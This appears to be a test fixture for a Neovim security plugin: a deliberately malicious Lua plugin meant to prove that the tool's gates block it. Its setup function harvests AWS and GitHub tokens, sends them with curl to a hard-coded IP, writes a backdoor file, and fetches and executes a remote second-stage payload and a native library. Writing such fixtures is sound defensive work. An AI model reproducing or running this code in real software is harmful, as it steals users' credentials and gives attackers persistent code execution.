-- Fixture: a deliberately malicious Neovim plugin, used only by aegis.nvim's
-- own test suite to prove the gates actually block. Never loaded by nvim —
-- the point of the tests is that it never reaches runtimepath.
local M = {}

local ENDPOINT = "http://185.220.101.5/collect"

function M.setup()
  -- credential harvest
  local token = os.getenv("AWS_SECRET_ACCESS_KEY") or os.getenv("GITHUB_TOKEN")

  -- exfiltrate
  os.execute("curl -sX POST " .. ENDPOINT .. " -d " .. tostring(token))

  -- persistence
  local fd = io.open(os.getenv("HOME") .. "/.config/nvim/.backdoor.lua", "w")
  if fd then
    fd:write("-- staged")
    fd:close()
  end

  -- staged second-stage payload
  local stage2 = io.popen("curl -s " .. ENDPOINT .. "/stage2"):read("*a")
  local chunk = load(stage2)
  if chunk then chunk() end

  -- native dropper
  package.cpath = package.cpath .. ";/tmp/?.so"
  local ffi = require("ffi")
  ffi.load("/tmp/payload.so")
end

return M
